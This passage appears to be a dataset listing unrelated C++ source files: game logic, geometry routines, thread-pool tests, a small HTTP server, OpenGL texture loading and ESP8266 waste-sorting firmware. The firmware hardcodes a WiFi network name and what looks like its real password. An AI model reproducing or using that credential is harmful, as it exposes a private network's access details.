(computer_grid.get_ship_coords().size() == 0) {\n            game_end = true;\n            std::cout << \"You win!\" << std::endl;\n            game_end = true;\n            continue;\n            ///\n            /// The continue statement is here to make sure the computer doesn't get a guess in once the user wins. \n            /// \n        }\n\n        std::cout << std::endl << \"Computer attack: \" ;\n        attack_of_the_computer(player_grid);\n        \n        if (player_grid.get_ship_coords().size() == 0) {\n            std::cout << \"Computer wins :(\" << std::endl;\n            std::cout << \"The computer grid was: \" <<std::endl;\n            std::cout << computer_grid;\n            game_end = true;\n        }\n    }\n}",
    "#include \"Fractures.hpp\"\n#include \"Utils.hpp\"\n#include \"PolygonalMesh.hpp\"\n#include \"UCDUtilities.hpp\"\n\n#include<iostream>\n#include<sstream>\n#include<fstream>\n#include<vector>\n#include <Eigen/Eigen>\n#include <functional> //per le lambda function\n#include <list>\n#include <cassert> //per mergesort\n#include <queue>\n#include <map>\n#include <functional>\n\nusing namespace std;\nusing namespace Eigen;\nusing namespace Algebra;\nusing namespace detail;\nusing namespace PolygonalMeshLibrary;\n\n\nnamespace Geometry{\nbool readFractures(const string& fileName, vector<Fracture>& vec, double tol){\n    ifstream ifstr(fileName);\n    if(ifstr.fail()){\n        cerr << \"errore nell'apertura del file\" << endl;\n        return false;\n    }\n    string header; //da ignorare\n    getline(ifstr, header);\n\n    string line;\n    char c; //lo uso dopo per togliere i ';'\n    getline(ifstr, line);\n    istringstream convert(line);\n    unsigned int numFractures;\n    convert >> numFractures;\n    vec.reserve(numFractures);\n\n    while(getline(ifstr,line)){ //toglie gi\u00e0 la prima riga con #\n        Fracture frac;\n        getline(ifstr, line);\n        istringstream convert(line);\n        convert >> frac.idFrac >> c >> frac.numVertices;\n        frac.vertices.resize(frac.numVertices);\n\n        getline(ifstr, line); //da ignorare\n        bool firstTime=false; //per gestire i ';'\n        for (unsigned int i=0; i<3; i++){ //3 dimensioni (i=0 componente x)\n            getline(ifstr, line);\n            istringstream convert2(line);\n            firstTime=true;\n            for (unsigned int j=0; j<frac.numVertices; j++){ //numero di vertici\n                if (! firstTime){\n                    convert2 >> c; //tolgo il ';' prima di ogni componente tranne la prima\n                }\n                convert2 >> ((frac.vertices)[j])[i];\n                firstTime=false;\n            }\n        }\n\n        for (unsigned int k=0; k<frac.numVertices-1; k++){ //controllo che non ci siano lati di lunghezza nulla.\n            //In questo caso tolgo la frattura e metto nel vettore una frattura con id -1\n            Vector3d edge = (frac.vertices)[k]-(frac.vertices)[k+1]; //differenza tra due vertici consecutivi\n            double tol2=max(10*numeric_limits<double>::epsilon(), tol*tol);\n            if (edge.squaredNorm()<tol2){//distanza al quadrato in modo da non dover valutare la radice quadrata\n                cerr << \"la frattura \" << frac.idFrac << \" ha lati di lunghezza nulla\" << endl;\n                frac.idFrac=-1; //come se fosse null\n                break;\n            }\n        }\n        Vector3d edgeF = (frac.vertices)[0]-(frac.vertices)[frac.numVertices-1]; //faccio lo stesso per il primo e l'ultimo vertice\n        double tol2=max(10*numeric_limits<double>::epsilon(), tol*tol);\n        if (edgeF.squaredNorm()<tol2){\n            cerr << \"la frattura \" << frac.idFrac << \" ha lati di lunghezza nulla\" << endl;\n            frac.idFrac=-1;\n        }\n        vec.push_back(frac);\n    }\n    ifstr.close();\n    return true;\n}\n\nvector<Trace> findTraces(vector<Fracture>& fractures, double tol){ //date tutte le fratture, trova tutte le tracce e le restituisce in un vettore\n    list<Trace> listTraces; //metto prima in una lista per efficienza nell'aggiungere le nuove tracce, poi in un vettore per efficienza nell'accesso casuale\n    vector<Trace> vectorTraces;\n    for (unsigned int i=0; i<fractures.size(); i++){//devo controllare ogni coppia di fratture possibile\n        for(unsigned int j=i+1; j<fractures.size(); j++){\n                //controllo se i due poligoni sono molto lontani (bounding box) e in quel caso passo alla coppia successiva\n                //prima cerco centro (facendo la media dei vertici) e raggio (massima distanza tra il centro e i vertici) delle bounding box\n                bool pass = passBoundingBox(fractures[i],fractures[j]);\n                if(pass){ //vado avanti solo se il controllo della\n                //bounding box non \u00e8 passato (se le due probabilmente si intersecano)\n                    array<Vector3d,4> intPoints;//qui metter\u00f2 i potenziali punti di intersezione\n                    array<bool,2> onThePlane;\n                    bool passIntPlane = findIntersectionPoints(fractures[i],fractures[j],intPoints,tol, onThePlane);\n                    if(passIntPlane){//ora vedo se c'\u00e8 effettivamente intersezione\n                        //e stabiliamo tra i 4 potenziali chi sono i punti di intersezione\n                        array<Vector3d,2> extremities; //qui salver\u00f2 i due punti estremi della traccia\n                        array<bool,2> tips = {true,true}; //se resta cos\u00ec \u00e8 non passante per entrambi\n                        bool intersection = findInternalPoints(intPoints,tol,extremities,tips);\n                        //modifico tips in caso di onThePlane\n                        if(onThePlane[0]){\n                            tips[0]=false;\n                        }\n                        if(onThePlane[1]){\n                            tips[1]=false;\n      ",
    "#include \"thread_pool.h\"\n\n#include <gtest/gtest.h>\n\nnamespace mca {\nnamespace test {\nTEST(TestThreadPool, defaultConstructor) {\n    ThreadPool tp;\n    ASSERT_EQ(tp.size(), (size_t)5);\n    ASSERT_EQ(tp.getTaskNum(), (size_t)0);\n}\n\nTEST(TestThreadPool, setThreadNum) {\n    ThreadPool tp(3);\n    ASSERT_EQ(tp.size(), (size_t)3);\n    ASSERT_EQ(tp.getTaskNum(), (size_t)0);\n    tp.resize(5);\n    ASSERT_EQ(tp.size(), (size_t)5);\n    ASSERT_EQ(tp.getTaskNum(), (size_t)0);\n    tp.resize(2);\n    ASSERT_EQ(tp.size(), (size_t)2);\n    ASSERT_EQ(tp.getTaskNum(), (size_t)0);\n}\n\nTEST(TestThreadPool, addTask) {\n    ThreadPool tp(0);\n    size_t taskNum = 10;\n    std::vector<std::future<size_t>> resultVector;\n    for (size_t i = 0; i < taskNum; i++) {\n        resultVector.emplace_back(\n            tp.addTask([](size_t a, size_t b) -> size_t { return a + b; }, (size_t)2, (size_t)3));\n    }\n    ASSERT_EQ(tp.getTaskNum(), taskNum);\n    tp.resize(5);\n    for (size_t i = 0; i < taskNum; i++) {\n        ASSERT_EQ(resultVector[i].get(), (size_t)2 + (size_t)3);\n    }\n}\n\n// this test will check if the running task will be executed normally\n// and if the other tasks are removed\nTEST(TestThreadPool, clear) {\n    using namespace std::chrono_literals;\n    ThreadPool tp(1);\n    std::vector<std::future<size_t>> resultVector;\n    size_t taskNum = 10;\n    for (size_t i = 0; i < taskNum; i++) {\n        resultVector.emplace_back(tp.addTask([]() -> size_t {\n            std::this_thread::sleep_for(500ms);\n            return 233;\n        }));\n    }\n    // this is to make sure the first task is running\n    std::this_thread::sleep_for(50ms);\n    tp.clear();\n    EXPECT_EQ(resultVector[0].get(), (size_t)233);\n    ASSERT_EQ(tp.getTaskNum(), size_t(0));\n    ASSERT_EQ(tp.size(), size_t(0));\n}\n\n}  // namespace test\n}  // namespace mca\n",
    "#include \"host.h\"\n#include \"../util/logger.h\"\n\nbool hosts::Host::isAllowed(const std::string &ipaddr) {\n    return allowedIps.find(ipaddr) != allowedIps.end();\n}\n\nvoid hosts::Host::run(httplib::Server &server, Loggable &loggable) {\n    filterByIp(server, loggable);\n    setupErrors(server, loggable);\n    setupRoutes(server, loggable);\n    std::string message = \"server listening on \" + ip + \":\" + std::to_string(port);\n    LOG_INFO(loggable, message.c_str());\n    server.listen(ip.c_str(), port);\n}\n\nvoid hosts::Host::filterByIp(httplib::Server &server, Loggable &loggable) {\n    server.set_logger([&loggable](auto &req, auto &res) {\n        std::string logMessage = req.remote_addr + \" \" + req.method + \" \" + req.path;\n        if (res.status != -1) {\n            logMessage += \" \" + std::to_string(res.status);\n        }\n        LOG_INFO(loggable, logMessage.c_str());\n        return logMessage;\n    });\n\n    server.set_pre_routing_handler([this, &loggable](const httplib::Request &req, httplib::Response &res) {\n        if (!isAllowed(req.remote_addr)) {\n            auto error = \"Unauthorized: \" + req.remote_addr;\n            LOG_ERROR(loggable, error.c_str());\n            res.status = 403;\n            res.set_content(error, \"text/plain\");\n            return httplib::Server::HandlerResponse::Handled;\n        }\n\n        return httplib::Server::HandlerResponse::Unhandled;\n    });\n}\n\nvoid hosts::Host::setupErrors(httplib::Server &server, Loggable &loggable) {\n    server.set_error_handler([&loggable](const httplib::Request &req, httplib::Response &res) {\n        auto ipAddr = \"IP:\" + req.get_header_value(\"REMOTE_ADDR\") + \" \";\n        auto methodAndPath = req.method + \" \" + req.path;\n        auto status = \" \" + std::to_string(res.status) + \"\";\n        auto logStr = ipAddr + methodAndPath + status;\n        std::string error = \"Error: \" + std::to_string(res.status) + \" - \" + res.reason;\n        LOG_ERROR(loggable, logStr.c_str());\n    });\n}\n\nvoid hosts::Host::setupRoutes(httplib::Server &server, Loggable &loggable) {\n    server.Get(\"/ping\", [&loggable](const httplib::Request &req, httplib::Response &res) {\n        LOG_INFO(loggable, \"Ping\");\n        res.set_content(\"Pong\", \"text/plain\");\n    });\n\n    server.Get(\"/health\", [&loggable](const httplib::Request &req, httplib::Response &res) {\n        LOG_INFO(loggable, \"Health\");\n        res.set_content(\"Healthy\", \"text/plain\");\n    });\n}",
    "#include \"pins.h\"\n#include <WifiEspNow.h>\n#include \"ESP8266_ISR_Servo.h\"\n#include <ESP8266WiFi.h>\n\nconst char* ssid = \"SABAKADIHA 2.4\";\nconst char* password = \"Neyney2008@\";\nconst uint8_t PEER[]{0x30, 0xC6, 0xF7, 0x30, 0xBB, 0x39}; // MAC Address Of ESP32\n\nstatic short servoIndex = -1;\nstatic bool isWasteBiodegradable;\nstatic bool isMessageReceived = false;\nstatic bool isAwaitingSegregation = false;\nstatic bool isConnectedToWifi;\n\nbool getInfraredSensorStatus() {\n    int sensorStatus = digitalRead(INFRARED_SENSOR_PIN);\n    if (sensorStatus == 1) {\n        return false;\n    } else {\n        return true;\n    }\n}\n\nbool isWasteInFrontOfCamera() {\n    if (getInfraredSensorStatus() == true) {\n        return true;\n    } else {\n        return false;\n    }\n}\n\nvoid throwWasteIntoBiodegradableBin() {\n    ISR_Servo.setPosition(servoIndex, 20);\n}\n\nvoid throwWasteIntoNonBiodegradableBin() {\n    ISR_Servo.setPosition(servoIndex, 160);\n}\n\nvoid setServoToNeutralPosition() {\n    ISR_Servo.setPosition(servoIndex, 90);\n}\n\nvoid setupServoPins() {\n    servoIndex = ISR_Servo.setupServo(SEGRAGATOR_SERVO_PIN); //TODO: Verify MIN-MAX Pulse Width\n    if (servoIndex == -1) {\n        Serial.println(\"Servo Setup Error!\");\n    } else {\n        setServoToNeutralPosition();\n    }\n}\n\nvoid onMessageReceived(const uint8_t mac[WIFIESPNOW_ALEN], const uint8_t* buf, size_t count, void* arg)\n{   \n    Serial.println();\n    Serial.print(\"Message Received From: \");\n    Serial.printf(\"{0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X}\\n\", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);\n    Serial.println();\n    isMessageReceived = true;\n    if (buf[0] != 0) {\n        // waste is biodegradable\n        isWasteBiodegradable = true;\n    } else {\n        isWasteBiodegradable = false;\n    }\n}\n\nvoid setupESPNOW() {\n    bool ok = WifiEspNow.begin();\n    if (!ok) {\n        Serial.println(\"WifiEspNow.begin() failed\");\n        ESP.restart();\n    }\n\n    WifiEspNow.onReceive(onMessageReceived, nullptr);\n\n    ok = WifiEspNow.addPeer(PEER);\n    if (!ok) {\n        Serial.println(\"WifiEspNow.addPeer() failed\");\n        ESP.restart();\n    }\n}\n\nvoid printMacAddress() {\n    Serial.print(\"MAC address of this node is \");\n    Serial.println(WiFi.softAPmacAddress());\n\n    uint8_t mac[6];\n    WiFi.softAPmacAddress(mac);\n    Serial.println();\n    Serial.println(\"You can paste the following into the program for the other device:\");\n    Serial.printf(\"static uint8_t PEER[]{0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X};\\n\", mac[0],\n                    mac[1], mac[2], mac[3], mac[4], mac[5]);\n    Serial.println();\n}\n\nvoid blinkLED() {\n  digitalWrite(LED_BUILTIN, HIGH); // OFF\n  delay(500);\n  digitalWrite(LED_BUILTIN, LOW); // ON\n  delay(1000);\n  digitalWrite(LED_BUILTIN, HIGH); // OFF\n  delay(500);\n}\n\nvoid setup() {\n    Serial.begin(115200);\n    Serial.println();\n\n    setupServoPins();\n    pinMode(INFRARED_SENSOR_PIN, INPUT);\n    pinMode(LED_BUILTIN, OUTPUT);\n\n    WiFi.persistent(false);\n    WiFi.mode(WIFI_STA);\n    WiFi.begin(ssid, password);\n    if (WiFi.waitForConnectResult() != WL_CONNECTED) {\n        Serial.printf(\"WiFi failure; Status: %d\\n\", WiFi.status());\n        isConnectedToWifi = false;\n    } else {\n        // WiFi Connection Successful\n        Serial.printf(\"WiFi success; Status: %d\\n\", WiFi.status());\n        isConnectedToWifi = true;\n        WiFi.softAP(\"ESPNOW\", nullptr, 3);\n        WiFi.softAPdisconnect(false);\n        printMacAddress();\n        setupESPNOW();\n    }\n    blinkLED();\n}   \n\nvoid checkForWastePresenceAndInformESP32() {\n    if (isWasteInFrontOfCamera() == true) {\n        Serial.println(\"Waste In Front Of Camera: True\");\n        byte data[1];\n        data[0] = true;\n        if (isAwaitingSegregation == false) {\n            if (WifiEspNow.send(PEER, data, sizeof(data)) == true) {\n                isAwaitingSegregation = true;\n                Serial.println(\"Successfully Informed PEER\");\n            } else {\n                Serial.println(\"Failed To Inform Peer\");\n            }\n        }\n    } else {\n        Serial.println(\"Waste In Front Of Camera: False\");\n    }\n}\n\nvoid segregateWaste() {\n    if (isMessageReceived == true) {\n        if (isWasteBiodegradable == true) {\n            Serial.println(\"Waste Is Biodegradable\");\n            throwWasteIntoBiodegradableBin();\n        } else {\n            Serial.println(\"Waste Is Non-Biodegradable\");\n            throwWasteIntoNonBiodegradableBin();\n        }\n        isMessageReceived = false;\n        delay(5000);\n        isAwaitingSegregation = false;\n        setServoToNeutralPosition();\n    }\n}\n\nvoid testServos() {\n    if (isWasteInFrontOfCamera() == true) {\n        throwWasteIntoBiodegradableBin();\n        delay(2500);\n        throwWasteIntoNonBiodegradableBin();\n        delay(2500);\n        setServoToNeutralPosition();\n        delay(2500);\n    }\n}\n\nvoid loop() {\n    if (isConnectedToWifi == true) {\n        checkForWastePresenceAndInformESP32();\n        segregateWaste();\n    } else {\n        testServos();\n    }",
    "#include <iostream>\r\n#include <cstdlib>\r\n#include <time.h>\r\n\r\nusing namespace std;\r\n\r\nint karta()\r\n{\r\n\treturn rand() % 52 + 2;\r\n}\r\n\r\nbool czywylosowana(int tab[], int liczba, int dl)\r\n{\r\n\tint i = 0;\r\n\tdo\r\n\t{\r\n\t\tif (tab[i] == liczba)\r\n\t\t\treturn true;\r\n\t\ti++;\r\n\t} while (i < dl + 1);\r\n\treturn false;\r\n}\r\n\r\nvoid poczatek(int z[], int g[], int dl, int ilosc)\r\n{\r\n\tint s = 0;\r\n\tint i = 0;\r\n\tdo\r\n\t{\r\n\t\ts = karta();\r\n\t\tif (czywylosowana(z, s, dl) == false)\r\n\t\t{\r\n\t\t\tg[i] = s;\r\n\t\t\ti++;\r\n\t\t\tdl++;\r\n\t\t\tz[dl] = s;\r\n\t\t}\r\n\r\n\t} while (i < ilosc);\r\n}\r\n\r\nint kartapoczatkowa()\r\n{\r\n\tint s = 0;\r\n\ts = karta();\r\n\treturn s;\r\n}\r\n\r\nstring zamiana(int l)\r\n{\r\n\tstring figura = \" \";\r\n\tint dwa = l - 2;\r\n\tint trzy = l - 3;\r\n\tint piec = l - 5;\r\n\tif (dwa % 4 == 0 or dwa == 0)\r\n\t\tfigura = \"pik\";\r\n\tif (l % 4 == 0)\r\n\t\tfigura = \"karo\";\r\n\tif (trzy % 4 == 0 or trzy == 0)\r\n\t\tfigura = \"kier\";\r\n\tif (piec % 4 == 0 or piec == 0)\r\n\t\tfigura = \"trefl\";\r\n\treturn figura;\r\n}\r\n\r\nint zamiana2(int l, string z)\r\n{\r\n\tif (z == \"pik\")\r\n\t\tl = ((l - 2) / 4) + 2;\r\n\tif (z == \"kier\")\r\n\t\tl = ((l - 3) / 4) + 2;\r\n\tif (z == \"karo\")\r\n\t\tl = ((l - 4) / 4) + 2;\r\n\tif (z == \"trefl\")\r\n\t\tl = ((l - 5) / 4) + 2;\r\n\treturn l;\r\n}\r\n\r\nvoid runda(int tab[], int ilekart, string ksf, int ksc)\r\n{\r\n\tstring figura;\r\n\tint cyfra;\r\n\tfor (int i = 0; i < ilekart; i++)\r\n\t{\r\n\t\tcout << i + 1; cout << \". \";\r\n\t\tfigura = zamiana(tab[i]);\r\n\t\tcout << figura;\r\n\t\tcout << \" \";\r\n\t\tcyfra = zamiana2(tab[i], figura);\r\n\t\tif (cyfra == 11)\r\n\t\t\tcout << \"jopek\";\r\n\t\telse if (cyfra == 12)\r\n\t\t\tcout << \"dama\";\r\n\t\telse if (cyfra == 13)\r\n\t\t\tcout << \"krol\";\r\n\t\telse if (cyfra == 14)\r\n\t\t\tcout << \"as\";\r\n\t\telse\r\n\t\t\tcout << cyfra;\r\n\t\tif (figura == ksf or cyfra == ksc or cyfra == 12 or ksc == 12)\r\n\t\t\tcout << \" mozna zagrac\";\r\n\t\tcout << endl;\r\n\t}\r\n}\r\n\r\nvoid kns(string knf, int knc)\r\n{\r\n\tstring figura;\r\n\tint cyfra;\r\n\tfigura = knf;\r\n\tcout << figura;\r\n\tcout << \" \";\r\n\tcyfra = knc;\r\n\tif (cyfra == 11)\r\n\t\tcout << \"jopek\";\r\n\telse if (cyfra == 12)\r\n\t\tcout << \"dama\";\r\n\telse if (cyfra == 13)\r\n\t\tcout << \"krol\";\r\n\telse if (cyfra == 14)\r\n\t\tcout << \"as\";\r\n\telse\r\n\t\tcout << cyfra;\r\n}\r\n\r\nvoid draw(int z[], int g[], int dl, int ile, int iledobrac)\r\n{\r\n\tint s = 0;\r\n\tint i = 0;\r\n\tdo\r\n\t{\r\n\t\ts = karta();\r\n\t\tif (czywylosowana(z, s, dl) == false)\r\n\t\t{\r\n\t\t\tg[ile] = s;\r\n\t\t\ti++;\r\n\t\t\tz[dl] = s;\r\n\t\t}\r\n\r\n\t} while (i < iledobrac);\r\n}\r\n\r\n\r\nvoid play(int tab[], int k, string kf, int kc, int ilekartwrence)\r\n{\r\n\tbool y = false;\r\n\tdo\r\n\t{\r\n\t\tif (zamiana(tab[k]) == kf or zamiana2(tab[k], zamiana(tab[k])) == kc or zamiana2(tab[k], zamiana(tab[k])) == 12 or kc == 12)\r\n\t\t{\r\n\t\t\tkf = zamiana(tab[k]);\r\n\t\t\tkc = zamiana2(tab[k], zamiana(tab[k]));\r\n\t\t\tfor (int i = 0; i < ilekartwrence - 1; i++)\r\n\t\t\t{\r\n\t\t\t\tif (i >= k)\r\n\t\t\t\t{\r\n\t\t\t\t\ttab[i] = tab[i + 1];\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\ty = true;\r\n\t\t}\r\n\t\telse\r\n\t\t\tcout << \"nie mozesz zagrac tej karty\" << endl;\r\n\t} while (y = false);\r\n\r\n}\r\n\r\n\r\nint main()\r\n{\r\n\tint dlugosc = 0;\r\n\tint juzdobrane[52];\r\n\tint iloscgraczy = 0;\r\n\tbool czyokgraczy = false;\r\n\tint koniec = 0;\r\n\tbool makao1 = false; bool makao2 = false; bool makao3 = false; bool makao4 = false;\r\n\tint gracz1[52]; int gracz2[52]; int gracz3[52]; int gracz4[52];\r\n\tint kartanastole; string kartanastolefigura; int kartanastolecyfra;\r\n\tint zastepczacyfra; string zastepczafigura;\r\n\tint ilekartwrence1 = 5; int ilekartwrence2 = 5; int ilekartwrence3 = 5; int ilekartwrence4 = 5;\r\n\tstring dzialaniegracza;\r\n\tint ktorarunda = 1;\r\n\tint karta;\r\n\tsrand(time(NULL));\r\n\r\n\tdo\r\n\t{\r\n\t\tcout << \"podaj ilosc graczy od 2 do 4\" << endl;\r\n\t\tcin >> iloscgraczy;\r\n\t\tif (iloscgraczy == 2 or iloscgraczy == 3 or iloscgraczy == 4)\r\n\t\t{\r\n\t\t\tczyokgraczy = true;\r\n\t\t}\r\n\t} while (czyokgraczy == false);\r\n\tkoniec = iloscgraczy;\r\n\tsystem(\"cls\");\r\n\r\n\tdo\r\n\t{\r\n\t\tkartanastole = kartapoczatkowa();\r\n\t\tkartanastolefigura = zamiana(kartanastole);\r\n\t\tkartanastolecyfra = zamiana2(kartanastole, kartanastolefigura);\r\n\t} while (kartanastolecyfra > 10);\r\n\tjuzdobrane[0] = kartanastole;\r\n\r\n\tpoczatek(juzdobrane, gracz1, dlugosc, ilekartwrence1);\r\n\tdlugosc += 5;\r\n\tpoczatek(juzdobrane, gracz2, dlugosc, ilekartwrence2);\r\n\tdlugosc += 5;\r\n\tif (iloscgraczy == 3 or iloscgraczy == 4)\r\n\t{\r\n\t\tpoczatek(juzdobrane, gracz3, dlugosc, ilekartwrence3);\r\n\t\tdlugosc += 5;\r\n\t}\r\n\tif (iloscgraczy == 4)\r\n\t{\r\n\t\tpoczatek(juzdobrane, gracz4, dlugosc, ilekartwrence4);\r\n\t\tdlugosc += 5;\r\n\t}\r\n\r\n\r\n\tdo\r\n\t{\r\n\t\tbool y = false;\r\n\t\tif (makao1 == false && ilekartwrence1 == 1)\r\n\t\t{\r\n\r\n\t\t\tfor (int i = 0; i <= 5; i++)\r\n\t\t\t{\r\n\t\t\t\tdraw(juzdobrane, gracz1, dlugosc, ilekartwrence1, 1);\r\n\t\t\t\tilekartwrence1 += 1;\r\n\t\t\t\tdlugosc += 1;\r\n\t\t\t}\r\n\r\n\t\t}\r\n\t\tif (makao2 == false && ilekartwrence2 == 1)\r\n\t\t{\r\n\r\n\t\t\tfor (int i = 0; i <= 5; i++)\r\n\t\t\t{\r\n\t\t\t\tdraw(juzdobrane, gracz2, dlugosc, ilekartwrence2, 1);\r\n\t\t\t\tilekartwrence2 += 1;\r\n\t\t\t\tdlugosc += 1;\r\n\t\t\t}\r\n\r\n\t\t}\r\n\t\tif (makao3 == false && ilekartwrence3 == 1)\r\n\t\t{\r\n\t\t\tfor (int i = 0; i <= 5; i++)\r\n\t\t\t{\r\n\t\t\t\tdraw(juzdobrane, gracz3, dlugosc, ilekartwrence3, 5);\r\n\t\t\t\tilekartwrence3 += 5;\r\n\t\t\t\tdlugosc += 5;\r\n\t\t\t}\r\n\t\t}\r\n\t\tif (makao4 == false && ilekartwrence4 == 1)\r\n\t\t{",
    "\ufeff#include <iostream>\n#include <SDL.h>\n#include <SDL_image.h>\n#include <SDL_mixer.h>;\n#include <SDL_ttf.h>;\n#include \"defs.h\"\n#include \"graphics.h\"\n#include <vector>\n#include \"game.h\"\n#include \"monster.h\";\n#include <cstdlib> // For rand() and srand()\n#include <ctime>   // For time()\n#include \"chaanimation.h\"\n#include <SDL_ttf.h>\n#include <string>\n#define FIRELIMIT 30\n#define FIREBALLLIMIT 4\n#include <fstream>\nusing namespace std;\n\nvoid logErrorAndExit(const char* msg, const char* error)\n{\n    SDL_LogMessage(SDL_LOG_CATEGORY_APPLICATION, SDL_LOG_PRIORITY_ERROR, \"%s: %s\", msg, error);\n    SDL_Quit();\n}\n\nSDL_Window* initSDL(int SCREEN_WIDTH, int SCREEN_HEIGHT, const char* WINDOW_TITLE)\n{\n    if (SDL_Init(SDL_INIT_EVERYTHING) != 0)\n        logErrorAndExit(\"SDL_Init\", SDL_GetError());\n\n    // SDL_Window* window = SDL_CreateWindow(WINDOW_TITLE, SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, SCREEN_WIDTH, SCREEN_HEIGHT, SDL_WINDOW_SHOWN);\n     //full screen\n    SDL_Window* window = SDL_CreateWindow(WINDOW_TITLE, SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, SCREEN_WIDTH, SCREEN_HEIGHT, SDL_WINDOW_FULLSCREEN_DESKTOP);\n    if (window == nullptr) logErrorAndExit(\"CreateWindow\", SDL_GetError());\n    if (!IMG_Init(IMG_INIT_PNG | IMG_INIT_JPG))\n        logErrorAndExit(\"SDL_image error:\", IMG_GetError());\n\n\n    return window;\n}\n\nSDL_Renderer* createRenderer(SDL_Window* window)\n{\n    SDL_Renderer* renderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED |\n        SDL_RENDERER_PRESENTVSYNC);\n    //Khi ch\u1ea1y trong m\u00e1y \u1ea3o (v\u00ed d\u1ee5 ph\u00f2ng m\u00e1y \u1edf tr\u01b0\u1eddng)\n    //renderer = SDL_CreateSoftwareRenderer(SDL_GetWindowSurface(window));\n\n    if (renderer == nullptr) logErrorAndExit(\"CreateRenderer\", SDL_GetError());\n\n    SDL_SetHint(SDL_HINT_RENDER_SCALE_QUALITY, \"linear\");\n    SDL_RenderSetLogicalSize(renderer, SCREEN_WIDTH, SCREEN_HEIGHT);\n\n    return renderer;\n}\n\nvoid quitSDL(SDL_Window* window, SDL_Renderer* renderer)\n{\n    IMG_Quit();\n\n    SDL_DestroyRenderer(renderer);\n    SDL_DestroyWindow(window);\n    SDL_Quit();\n}\n\nvoid waitUntilKeyPressed()\n{\n    SDL_Event e;\n    while (true) {\n        if (SDL_PollEvent(&e) != 0 &&\n            (e.type == SDL_KEYDOWN || e.type == SDL_QUIT))\n            return;\n        SDL_Delay(50);\n    }\n}\n\n\nint main(int argc, char* argv[])\n{\n    srand(time(NULL));\n    Graphics graphics;\n    graphics.init();\n    SDL_Texture* background = loadTexture(\"img//map1.png\", graphics.renderer);\n    SDL_Texture* heart = loadTexture(\"img/heart.png\", graphics.renderer);\n    SDL_Texture* heartless = loadTexture(\"img/heartless.png\", graphics.renderer);\n    SDL_Texture* burning = loadTexture(\"img//Fire.png\",graphics.renderer);\n    SDL_Texture* keyimg = loadTexture(KEYIMAGE,graphics.renderer);\n    SDL_Texture* warning = loadTexture(\"img\\\\Warning.png\", graphics.renderer);\n    SDL_Texture* warninglane = loadTexture(\"img\\\\warninglane.png\", graphics.renderer);\n    SDL_Texture* chadial = loadTexture(\"img\\\\characterdialogue.png\", graphics.renderer);\n    bool scorednewhighscore;\n    dialogue dial;\n    Key key;\n    int fireballoc = 0;\n    key.x = 370;\n    key.y = 280;\n    key.locx= 408;\n    key.locy = 308;\n    int firestate = 0;\n    int fireballloc = 0;\n    //375//277\n    Sprite idle;\n    SDL_Texture* chatexture = graphics.loadTexture(CHARACTERFILE);\n    idle.init(chatexture, IDLE_FRAME, IDLE_CLIPS);\n    Sprite moveright;\n    moveright.init(chatexture, MOVERIGHT_FRAME, MOVERIGHT_CLIPS);\n    Sprite moveup;\n    moveup.init(chatexture, MOVEUP_FRAME, MOVEUP_CLIPS);\n    Sprite moveleft;\n    moveleft.init(chatexture, MOVELEFT_FRAME, MOVELEFT_CLIPS);\n    Sprite movedown;\n    movedown.init(chatexture, MOVEDOWN_FRAME, MOVEDOWN_CLIPS);\n    Sprite slashleft;\n    slashleft.init(chatexture, SLASHLEFT_FRAME, SLASHLEFT_CLIPS);\n    Sprite slashdown;\n    slashdown.init(chatexture, SLASHDOWN_FRAME, SLASHDOWN_CLIPS);\n    Sprite slashright;\n    slashright.init(chatexture, SLASHRIGHT_FRAME, SLASHRIGHT_CLIPS);\n    Sprite slashup;\n    slashup.init(chatexture, SLASHUP_FRAME, SLASHUP_CLIPS);\n    Sprite chadeath;\n    chadeath.init(chatexture, CHADEATH_FRAME, CHADEATH_CLIPS);\n    Sprite slimeidle1;\n    SDL_Texture* slime = graphics.loadTexture(SLIMEFILE);\n    slimeidle1.init(slime, SLIME_IDLE_RIGHT_FRAME, SLIME_IDLE_RIGHT_CLIPS);\n    Sprite slimeidle2;\n    slimeidle2.init(slime, SLIME_IDLE_LEFT_FRAME, SLIME_IDLE_LEFT_CLIPS);\n    Sprite slimeright1;\n    slimeright1.init(slime, SLIME_MOVE_RIGHT_FRAME, SLIME_MOVE_RIGHT_CLIPS);\n    Sprite slimeleft1;\n    slimeleft1.init(slime, SLIME_MOVE_LEFT_FRAME, SLIME_MOVE_LEFT_CLIPS);\n    Sprite slimeright2;\n    slimeright2.init(slime, SLIME_MOVE_RIGHT_FRAME, SLIME_MOVE_RIGHT_CLIPS);\n    Sprite slimeleft2;\n    slimeleft2.init(slime, SLIME_MOVE_LEFT_FRAME, SLIME_MOVE_LEFT_CLIPS);\n    Sprite slimeright3;\n    slimeright3.init(slime, SLIME_MOVE_RIGHT_FRAME, SLIME_MOVE_RIGHT_CLIPS);\n    Sprite slimeleft3;\n    slimeleft3.init(slime, SLIME_MOVE_LEFT_FRAME, SLIME_MOVE_LEFT_CLIPS);\n    Sprite slimedeath1;\n    slimedeath1.init(",
    "#include \"rendering/Texture.hpp\"\n\n#include \"rendering/PPM.hpp\"\n#include \"rendering/Shader.hpp\"\n\n#include <glad/glad.h>\n\nTexture::Texture(const std::string &path, TextureType type)\n    : _path(path), _type(type) {}\n\nTexture::~Texture() { glDeleteTextures(1, &_id); }\n\nvoid Texture::load() {\n  glGenTextures(1, &_id);\n  glBindTexture(GL_TEXTURE_2D, _id);\n\n  // set the texture wrapping/filtering options (on the currently bound\n  // texture object)\n  glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\n  glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\n  glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER,\n                  GL_LINEAR_MIPMAP_LINEAR);\n  glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n\n  // load and generate the texture\n  PPM image(_path);\n  image.flipVertical();\n  image.flipHorizontal();\n  int width = image.getWidth();\n  int height = image.getHeight();\n  int numChannels = 3;\n  uint8_t *data = image.pixelDataPtr();\n\n  GLenum format;\n  if (numChannels == 1) {\n    format = GL_RED;\n  